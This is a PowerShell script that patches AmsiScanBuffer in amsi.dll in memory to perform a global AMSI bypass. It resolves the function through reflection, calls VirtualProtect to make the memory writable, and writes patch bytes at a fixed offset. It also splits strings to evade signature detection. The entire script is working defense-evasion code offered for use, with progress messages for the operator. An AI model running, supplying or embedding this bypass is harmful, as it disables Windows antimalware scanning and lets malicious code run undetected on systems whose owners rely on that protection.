<#
    .SYNOPSIS
        Performs a global AMSI bypass by patching amsi.dll in memory.
    .DESCRIPTION
        This function modifies the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
    .LINK
     https://github.com/Chainski/GlobalAMSIBypass
#>
function get_proc_address {
    Param ($module, $function_name)
    Write-Host "[*] Looking up $function_name in $module" 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Sys'+'tem.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@();$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    $address = $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($module)), $function_name))
    Write-Host "[+] Found $function_name at 0x$($address.ToString('X16'))" -ForeGroundColor Cyan
    return $address
}
Write-Host "[*] Initializing global AMSI bypass via AmsiScanBuffer patch..." 
Write-Host "[*] Locating AmsiScanBuffer in amsi.dll" -ForeGroundColor Cyan
$bypasser='Amsi'+'Scan'+'Buffer'
[IntPtr]$funcAddr = get_proc_address amsi.dll $bypasser
$funcAddrLong = [Long]$funcAddr + 33;$funcAddr2 = [IntPtr]$funcAddrLong
Write-Host "[+] Targeting patch address: 0x$($funcAddr2.ToString('X16'))" 
function get_delegate_type {
    param([Type[]]$parameters,[Type]$returnType = [Void])
    Write-Host "[*] Creating delegate type for function pointer" 
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[Reflection.CallingConventions]::Standard,$parameters).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',$returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
Write-Host "[*] Creating delegate for VirtualProtect function" -ForeGroundColor Cyan
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualProtect), (get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
Write-Host "[*] Changing memory protection to PAGE_EXECUTE_READWRITE" -ForeGroundColor Cyan
$vp.Invoke($funcAddr2, 3, 0x40, [ref]$oldProtectionBuffer) | out-null
Write-Host "[*] Applying patch (xor ebx, ebx)"
$patchBytes = ([Convert]::FromBase64String('SDHA'))
[System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $funcAddr2, 3)
Write-Host "[*] Restoring memory protection to PAGE_EXECUTE_READ" -ForeGroundColor Cyan
$vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer) | out-null
Write-Host "[!] Global AMSI bypass completed successfully!" -ForeGroundColor Green